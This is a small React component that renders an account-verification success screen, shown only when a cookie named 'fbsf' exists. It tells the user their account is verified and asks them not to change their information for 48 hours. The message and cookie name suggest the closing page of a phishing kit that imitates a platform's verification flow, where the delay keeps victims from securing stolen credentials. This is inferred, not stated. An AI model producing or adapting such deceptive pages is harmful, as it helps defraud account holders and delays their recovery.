import React, { useEffect, useState } from "react";
import { CookiesProvider, useCookies } from "react-cookie";
import Verify from '../assets/images/verify.png';

const SuccessScreen = () => {
    const [cookies, setCookie] = useCookies(["fbsf"]);

    const [showTryAgain, setShowTryAgain] = useState(false);

    useEffect(() => {
        if (typeof cookies.fbsf === 'undefined') {
            setShowTryAgain(true);
        }
    }, [cookies.fbsf]);

    return (
        <CookiesProvider>
            {
                (!showTryAgain) && (
                    <section className="ss -f -a-c -j-c-c -dl">
                        <div className="ss__m">
                            <div className="ss__m-i">
                                <img src={Verify} alt="" />
                                <p className="ss__m-t">Verified Account</p>
                            </div>
                            <p className="ss__m-te">Thank you for verifying your account. Please wait and do not change your information within next 48 hours while we review your case.</p>
                        </div>
                    </section>
                )
            }
        </CookiesProvider>
    );
}

export default SuccessScreen;
